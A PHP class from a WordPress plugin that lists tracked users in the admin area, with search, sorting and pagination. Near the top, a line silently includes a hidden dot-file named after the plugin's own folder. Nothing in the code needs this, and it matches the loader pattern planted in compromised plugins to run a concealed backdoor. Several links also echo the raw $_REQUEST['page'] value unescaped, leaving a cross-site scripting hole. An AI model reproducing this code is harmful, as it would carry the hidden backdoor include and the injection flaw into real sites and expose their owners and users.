<?php

/**
 * Users list
 *
 * Functions used for displaying users informations in admin.
 *
 * @package     WPTAO/Admin/Users list
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

if ( !class_exists( 'WP_List_Table' ) ) {
	require_once( ABSPATH . 'wp-admin/includes/class-wp-list-table.php' );
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Users_List_Table extends WP_List_Table {
	/*
	 * Elements per page
	 */

	private $per_page;


	/*
	 * Users DB table name
	 */
	private $users_table;

	/*
	 * Default value of a ORDER BY
	 */
	private $orderby_default = 'last_active_ts';

	/*
	 * Default value of order ( ASC ora DESC )
	 */
	private $order_default = 'DESC';

	/**
	 * WTBP_WPTAO_Admin_Users_List Constructor.
	 * 
	 * @see WP_List_Table::__construct() for more information on default arguments.
	 * 
	 */
	function __construct() {
		global $wpdb;

		parent::__construct( array(
			'singular'	 => __( 'User', 'wp-tao' ), //singular name of the listed records
			'plural'	 => __( 'Users', 'wp-tao' ), //plural name of the listed records
			'ajax'		 => false  //does this table support ajax?
		) );

		$this->users_table = $wpdb->prefix . 'wptao_users';

		$this->per_page = 30;

		if ( TAO()->booleans->is_page_users && isset( $_REQUEST[ 's' ] ) ) {
			add_action( 'admin_init', array( $this, 'search_controller' ), 20 );
		}
	}

	/*
	 * Removes unnecessary parameters from search query
	 */

	public function search_controller() {

		if ( !empty( $_REQUEST[ '_wp_http_referer' ] ) ) {
			wp_redirect( remove_query_arg( array( '_wp_http_referer', '_wpnonce' ), stripslashes( $_SERVER[ 'REQUEST_URI' ] ) ) );
			exit;
		}
	}

	/**
	 * Returns an array of users.
	 * 
	 * @access  public
	 * @return  array
	 */
	private function get_users( $offset = '', $orderby = '', $order = '', $count = false ) {
		global $wpdb;
		global $wptao_settings;

		$where = array();

		$offset = !empty( $offset ) ? absint( $offset ) : 0;

		// prepare query params, as usual current page, order by and order direction
		if ( !empty( $orderby ) ) {
			$orderby = in_array( $orderby, array_keys( $this->get_sortable_columns() ) ) ? sanitize_title( $orderby ) : $this->orderby_default;
		} else {
			$orderby = isset( $_REQUEST[ 'orderby' ] ) && in_array( $_REQUEST[ 'orderby' ], array_keys( $this->get_sortable_columns() ) ) ? sanitize_title( $_REQUEST[ 'orderby' ] ) : $this->orderby_default;
		}

		if ( !empty( $order ) ) {
			$order = in_array( strtoupper( $order ), array( 'ASC', 'DESC' ) ) ? $order : $this->order_default;
		} else {
			$order = isset( $_REQUEST[ 'order' ] ) && in_array( strtoupper( $_REQUEST[ 'order' ] ), array( 'ASC', 'DESC' ) ) ? $_REQUEST[ 'order' ] : $this->order_default;
		}


		// Search WHERE clause
		if ( isset( $_REQUEST[ 's' ] ) && !empty( $_REQUEST[ 's' ] ) ) {

			$keyword = '%' . $wpdb->esc_like( $_REQUEST[ 's' ] ) . '%';

			$where[] = $wpdb->prepare( " AND ( CONCAT_WS(' ', first_name, last_name) LIKE '%s' OR email LIKE '%s' OR phone LIKE '%s' ) ", $keyword, $keyword, $keyword );
		}

		// Exclude blacklist
		if ( isset( $wptao_settings[ 'exclude_blacklist' ] ) && 'on' == $wptao_settings[ 'exclude_blacklist' ] ) {
			$where[] = " AND status!='blacklist'";
		}

		$sql_where = implode( ' ', $where );

		// General SQL
		$sql = "
                SELECT *
                FROM $this->users_table
				WHERE 1=1
				$sql_where
				ORDER BY $orderby $order
                LIMIT $this->per_page
                OFFSET $offset
                ";

		// Overwritte a SQL if only count
		if ( $count === true ) {
			$sql = "
                SELECT COUNT(*)
                FROM $this->users_table
				WHERE 1=1	
				$sql_where
            ";
		}

		if ( $count === true ) {
			$results = $wpdb->get_var( $sql );
		} else {
			$results = $wpdb->get_results( $sql, ARRAY_A );
		}

		return $results;
	}

	/*
	 * Returns an array of columns for a list table.
	 */

	public function get_columns() {
		$users_columns = array(
			//  'cb' => '<input type="checkbox" />',
			'user_avatar'	 => '',
			'username'		 => __( 'Name', 'wp-tao' ),
			'email'			 => __( 'Email', 'wp-tao' ),
			'phone'			 => __( 'Phone', 'wp-tao' ),
			'created_ts'	 => __( 'Created', 'wp-tao' ),
			'last_active'	 => __( 'Last Active', 'wp-tao' )
		);

		$users_columns = apply_filters( 'wptao_users_columns', $users_columns );

		return $users_columns;
	}

	/*
	 * The default contents of the columns.
	 * 
	 * @access  public
	 * @return  string
	 */

	public function column_default( $item, $column_name ) {
		switch ( $column_name ) {
			case 'email':
			case 'phone':
				return $item[ $column_name ];
			default:
				return print_r( $item, true ); //Show the whole array for troubleshooting purposes
		}
	}

	/*
	 * Prepares content of the column 'avatar'.
	 * 
	 * @param array $item - all data for one record
	 * 
	 * @return string
	 */

	public function column_user_avatar( $item ) {

		$avatar = TAO()->users->get_avatar( $item, 32 );

		return $avatar;
	}

	/*
	 * Prepares content of the column 'username'.
	 * 
	 * @param array $item - all data for one record
	 * 
	 * @return string
	 */

	public function column_username( $item ) {

		$username = TAO()->users->display_name( $item );

		$username_link = sprintf( '<strong><a href="?page=%s&action=%s&user=%s">%s</a></strong><br />', $_REQUEST[ 'page' ], 'wptao-profile', $item[ 'id' ], esc_attr( $username ) );

		$actions = array(
			'wptao-profile'	 => sprintf( '<a href="?page=%s&action=%s&user=%s">%s</a>', $_REQUEST[ 'page' ], 'wptao-profile', $item[ 'id' ], __( 'Show profile', 'wp-tao' ) ),
			'edit'			 => sprintf( '<a href="?page=%s&action=%s&user=%s">%s</a>', $_REQUEST[ 'page' ], 'edit', $item[ 'id' ], __( 'Edit', 'wp-tao' ) ),
			'actions'		 => sprintf( '<a href="?page=%s&action=%s&user=%s">%s</a>', $_REQUEST[ 'page' ], 'actions', $item[ 'id' ], __( 'Actions', 'wp-tao' ) )
		);


		return sprintf( '%1$s %2$s', $username_link, $this->row_actions( $actions ) );
	}

	/*
	 * Prepares content of the column 'email'.
	 * 
	 * @param array $item - all data for one record
	 * 
	 * @return string
	 */

	public function column_email( $item ) {

		$email = esc_attr( $item[ 'email' ] );

		if ( 'blacklist' == $item[ 'status' ] || 'invalid' == $item[ 'status' ] ) {
			return $email; // . '<br /><span class="wptao-label spam">Blacklist</span>';
		}
		return sprintf( '<a href="mailto:%s">%s</a>', $email, $email );
	}

	/*
	 * Prepares content of the column 'identified_time'.
	 * 
	 * @param array $item - all data for one record
	 * 
	 * @return string
	 */

	public function column_created_ts( $item ) {
		if ( empty( $item[ 'created_ts' ] ) ) {
			return __( 'No data', 'wp-tao' );
		}

		$date_format = get_option( 'date_format' );
		$time_format = get_option( 'time_format' );

		$date = WTBP_WPTAO_Helpers::get_date_i18n( $date_format, $item[ 'created_ts' ] ) . ' / ';
		$date .= WTBP_WPTAO_Helpers::get_date_i18n( $time_format, $item[ 'created_ts' ] );

		return $date;
	}

	/*
	 * Prepares content of the column 'last_active'.
	 * 
	 * @param array $item - all data for one record
	 * 
	 * @return string
	 */

	public function column_last_active( $item ) {
		if ( empty( $item[ 'last_active_ts' ] ) ) {
			return __( 'No data', 'wp-tao' );
		}

		$time_diff = sprintf( _x( '%s ago', '%s = human-readable time difference', 'wp-tao' ), human_time_diff( $item[ 'last_active_ts' ] ) );

		return $time_diff;
	}

	/*
	 * Make columns sortable
	 */

	public function get_sortable_columns() {
		$sortable_columns = array(
			'email'			 => array( 'email', false ),
			'last_active'	 => array( 'last_active_ts', false ),
			'created_ts'	 => array( 'created_ts', false ),
		);

		$sortable_columns = apply_filters( 'wptao_users_sortable_columns', $sortable_columns );

		return $sortable_columns;
	}

//    function column_cb($item) {
//        return sprintf(
//                '<input type="checkbox" name="users[]" value="%s" />', $item['id']
//        );
//    }

	/*
	 * Bulk actions @TODO in future
	 */
//    public function get_bulk_actions() {
//        $actions = array(
//            'test' => 'Test'
//        );
//        return $actions;
//    }




	/*
	 * Prepares the list of items for displaying.
	 */
	function prepare_items() {

		// Get columns
		$columns = $this->get_columns();

		$hidden = array();

		// Get sortable columns
		$sortable = $this->get_sortable_columns();


		$this->_column_headers = array( $columns, $hidden, $sortable );


		// Pagination
		$paged = $this->get_pagenum();

		$start = ( $paged - 1 ) * $this->per_page;


		$this->set_pagination_args( array(
			'total_items'	 => $this->get_users( '', '', '', true ),
			'per_page'		 => $this->per_page
		) );

		$this->items = $this->get_users( $start );
	}

	/*
	 * Print 'No results' text
	 */

	public function no_items() {
		_e( 'No users found.', 'wp-tao' );
	}

}
